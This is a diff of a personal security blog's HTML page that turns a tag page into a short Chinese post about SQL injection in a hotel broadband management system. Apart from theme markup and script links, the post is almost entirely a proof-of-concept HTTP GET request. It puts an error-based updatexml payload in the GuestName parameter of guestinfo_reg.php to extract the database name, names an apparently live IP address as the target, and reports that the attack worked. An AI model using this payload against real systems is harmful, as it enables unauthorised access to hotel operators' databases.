@@ -16,19 +16,41 @@
   <meta name="author" content="0ldcat">
   <meta name="keywords" content="">
   
-    <meta property="og:type" content="website">
-<meta property="og:title" content="标签">
-<meta property="og:url" content="http://example.com/tags/index.html">
+    <meta name="description" content="&#x2F;user&#x2F;portal&#x2F;guestinfo_reg.php 通过GuestName参数注入获取当前数据库名 POC 12345678910111213141516GET &#x2F;user&#x2F;portal&#x2F;guestinfo_reg.php?Query&#x3D;GuestName&amp;GuestName&#x3D;1\%27%20and%20updatexml(1,concat(0x7e,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="安美数字酒店宽带运营系统前台SQL注入漏洞guestinfo_reg.php">
+<meta property="og:url" content="http://example.com/2024/11/13/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-1/index.html">
 <meta property="og:site_name" content="0ldcat_blog">
+<meta property="og:description" content="&#x2F;user&#x2F;portal&#x2F;guestinfo_reg.php 通过GuestName参数注入获取当前数据库名 POC 12345678910111213141516GET &#x2F;user&#x2F;portal&#x2F;guestinfo_reg.php?Query&#x3D;GuestName&amp;GuestName&#x3D;1\%27%20and%20updatexml(1,concat(0x7e,">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/11/13/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-1/wps5.jpg">
+<meta property="article:published_time" content="2024-11-13T13:51:28.000Z">
+<meta property="article:modified_time" content="2024-11-13T13:53:20.830Z">
 <meta property="article:author" content="0ldcat">
+<meta property="article:tag" content="漏洞备份">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2024/11/13/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-1/wps5.jpg">
   
   
-  <title>标签 - 0ldcat_blog</title>
+  <title>安美数字酒店宽带运营系统前台SQL注入漏洞guestinfo_reg.php - 0ldcat_blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
 
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
 
 
 <!-- 主题依赖的图标库，不要自行修改 -->
@@ -55,7 +77,7 @@
 
 
 <body>
-  <header style="height: 80vh;">
+  <header style="height: 70vh;">
     <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand" href="/">
@@ -144,17 +166,47 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="标签">
+            <span class="h2" id="subtitle" title="安美数字酒店宽带运营系统前台SQL注入漏洞guestinfo_reg.php">
               
             </span>
 
             
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2024-11-13 21:51" pubdate>
+        2024年11月13日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      704 个字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      6 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
           </div>
 
-          
-            <div class="scroll-down-bar">
-              <i class="iconfont icon-arrowdown"></i>
-            </div>
           
         </div>
       </div>
@@ -163,24 +215,65 @@
 
   <main>
     
-      <div class="container nopadding-x-md">
-        <div class="py-5" id="board"
-          >
-          
-          <div class="container">
-            <div class="row">
-              <div class="col-12 col-md-10 m-auto">
-                
+      
 
-<div class="text-center tagcloud">
-  <a href="/tags/C2/" style="font-size: 26.25px; color: #558ac5">C2</a> <a href="/tags/CTF/" style="font-size: 15px; color: #bbe">CTF</a> <a href="/tags/SRC/" style="font-size: 15px; color: #bbe">SRC</a> <a href="/tags/ai/" style="font-size: 15px; color: #bbe">ai</a> <a href="/tags/%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/" style="font-size: 15px; color: #bbe">三层靶机</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 15px; color: #bbe">安全</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 18.75px; color: #99abe0">渗透</a> <a href="/tags/%E6%BC%8F%E6%B4%9E/" style="font-size: 15px; color: #bbe">漏洞</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%87%E4%BB%BD/" style="font-size: 30px; color: #337ab7">漏洞备份</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 18.75px; color: #99abe0">漏洞复现</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-%E9%9D%B6%E5%9C%BA/" style="font-size: 15px; color: #bbe">网络安全 靶场</a> <a href="/tags/%E8%B6%8A%E6%9D%83/" style="font-size: 15px; color: #bbe">越权</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 22.5px; color: #779bd3">靶场</a>
-</div>
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">安美数字酒店宽带运营系统前台SQL注入漏洞guestinfo_reg.php</h1>
+            
+            <div class="markdown-body">
+              <p>&#x2F;user&#x2F;portal&#x2F;guestinfo_reg.php</p>
+<p>通过GuestName参数注入获取当前数据库名</p>
+<p>POC</p>
+<figure class="highlight http"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/user/portal/guestinfo_reg.php?Query=GuestName&amp;GuestName=1\%27%20and%20updatexml(1,concat(0x7e,(database())),3)--%20q</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>218.94.5.34:7070<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">X-Forwarded-For</span><span class="hljs-punctuation">: </span>1.1.1.1<br><span class="hljs-attribute">Te</span><span class="hljs-punctuation">: </span>trailers<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br> <br></code></pre></div></td></tr></table></figure>
 
-              </div>
+<p>成功获取到数据库名：<em><strong>*DB_HIBOS*</strong></em></p>
+<p><img src="/2024/11/13/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-1/wps5.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
+
             </div>
-          </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%87%E4%BB%BD/">漏洞备份</a>
+                    
+                  </div>
+                
+              </div>
+              
+              
+            </div>
+
+            
+          </article>
         </div>
       </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
     
 
     
@@ -264,6 +357,19 @@
   
 
 
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
 
 
 
